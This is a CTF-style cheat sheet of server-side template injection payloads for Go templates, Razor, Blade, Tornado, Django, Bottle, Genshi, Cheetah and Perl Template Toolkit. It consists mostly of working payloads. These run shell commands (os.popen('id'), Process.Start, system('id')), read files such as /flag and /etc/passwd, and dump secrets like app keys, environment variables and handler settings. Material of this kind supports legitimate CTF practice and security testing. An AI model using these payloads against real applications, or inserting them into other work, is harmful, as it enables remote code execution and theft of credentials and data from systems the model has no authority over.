# Misc engines — Go templates, Razor, Blade, Tornado, others

The remaining engines — less common in CTF but they do appear.

---

## 1. Go `text/template` / `html/template`

```go
{{7*7}}                  → parse error — Go templates have no `*`
{{.}}                    → the whole dot-context — DUMPS EVERYTHING
{{.Secrets}}              → struct field
{{.Flag}}                 → flag if bound
{{index . "flag"}}        → map access
{{range $k,$v := .}}{{$k}}={{$v}} {{end}}   → iterate the map
{{printf "%s" .}}          → stringify context
{{len .}}                  → funcs are predefined only
{{call .Method}}           → method calls on bound objects
```

Go templates are limited — no arithmetic, only field-access and
registered functions. The surface:

- `{{.}}` dumps the whole data object — the flag is often a field.
- `{{.Method}}` calls exported methods on bound objects — if the
  struct has a `ReadFile`-ish method or returns a sensitive field.
- Custom funcs registered by the app (`exec`, `getenv`, `readFile`)
  — enumerate by guessing common names.

`html/template` escapes output — no XSS; `text/template` doesn't.

---

## 2. Razor (.NET) — `@expr`

```razor
@7*7                         → @7*7 literal? — Razor needs @(7*7)
@(7*7)                        → 49
@DateTime.Now                 → current time — proves eval
@System.IO.File.ReadAllText("/flag")
@System.Diagnostics.Process.Start("sh","-c id")
@Environment.GetEnvironmentVariable("FLAG")
@ViewBag.Flag                  -- bound data
@Model.Flag                    -- model fields
@Context.Request.Cookies["x"]
@Html.Raw(x)                   -- raw html — XSS
```

Razor compiles to C# — `System.*` namespaces reachable directly
if the template compiles user input. Rare in CTF but brutal.

---

## 3. Blade (Laravel) — `{{ }}`/`{!! !!}` — note: not SSTI-able!

```php
{{ $x }}                      -- escaped output — not template-eval
                              -- of user input by default
{!! $x !!}                    -- raw output — XSS not SSTI
@php system('id'); @endphp    -- @php directive — needs the input
                              -- to land INSIDE a compiled template
{{7*7}}                        → literal {{7*7}} — Blade compiles
                              -- templates to PHP at build-time;
                              -- user input is DATA not template
```

Important: Blade input is NOT compiled — `{{7*7}}` in user data
stays literal. Laravel SSTI comes via `eval()`/`blade::render`/
`view()->make($userInput)` server-side — the vuln is the app
rendering user input AS a template path or compiling a string.
When it IS exploitable:

```php
@php system('id'); @endphp
{{ system('id') }}              -- if raw-eval'd
{{ \Illuminate\Support\Facades\DB::select('select * from flag') }}
{{ config('app.key') }}
{{ env('FLAG') }}
```

---

## 4. Tornado templates — Python `{{ }}`

```python
{{7*7}}                            → 49
{% import os %}{{ os.popen('id').read() }}
{% import os; x=os.popen('id').read() %}{{x}}
{{ __import__('os').popen('id').read() }}
{{ open('/flag').read() }}
{{ handler.settings }}               -- tornado app settings — secrets!
{{ handler.application }}
{{ request }}
{{ escape.xhtml_escape }}
```

`{% import os %}` then `{{os.x}}` — Tornado's module syntax. No
sandbox — full Python.

`handler.settings` often holds the app config incl. secrets/flag.

---

## 5. Bottle/Django templates — low-RCE profile

```django
{{7|add:0}}                 → 7 — Django's limited filters
{{user}}                     -- bound objects
{{user.password}}            -- model fields
{{settings}}                  -- if bound
{% include "/etc/passwd" %}   -- include path traversal
{% load x %}{% x %}           -- custom tags — exploitable if
                              -- dangerous taglibs registered
{{x|safe}}                    -- unescaped output — XSS
```

Django templates are logic-less by design — NO expression eval.
`{% include %}` path-traversal is the file-read primitive.
`{{user.password}}` field-leaks are the data surface.

Bottle's SimpleTemplate is Python-expressive:

```python
{{7*7}}                → 49
{{__import__('os').popen('id').read()}}
%import os
%x = os.popen('id').read()       -- % statements
{{x}}
```

---

## 6. Genshi/Cheetah — older Python engines

```xml
<!-- Genshi (xml-based): -->
${7*7}
${__import__('os').popen('id').read()}
<py:eval code="__import__('os').popen('id').read()"/>

<!-- Cheetah: -->
$7*7 → literal?    Cheetah uses $var placeholders
#exec __import__('os').popen('id').read()
${__import__('os').popen('id').read()}
$self.getVar('x')
$request
```

---

## 7. Swift/Perl/others — long-tail

```text
Starman/StTemplate (perl): [% x %] similar TT syntax
Template::Toolkit (perl TT): [% x %] [% USE x %] — plugin-gadget
  [% x.eval('...') %] [% PERL %]system('id')[% END %]
PHPTAL, Mustache (all langs): logic-less — XSS only via {{{}}}
Go: pongo2 — Jinja-ish on Go: {{x}} filters, limited escapes
```

TT's `[% PERL %]` blocks run Perl when `EVAL_PERL` enabled —
`[% PERL %]` + `system('id')` + `[% END %]`.
